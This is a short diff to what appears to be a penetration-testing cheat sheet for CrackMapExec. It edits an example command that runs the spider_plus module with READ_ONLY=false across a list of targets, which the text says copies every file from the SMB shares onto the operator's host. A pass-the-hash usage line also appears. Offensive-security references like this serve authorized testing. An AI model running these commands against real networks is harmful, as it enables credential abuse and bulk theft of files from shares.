@@ -933,5 +933,5 @@ crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
 Using the option `-o READ_ONLY=false` all files will be copied on the host
 
 ```
-crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
+crackmapexec smb targets.txt -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
 ```
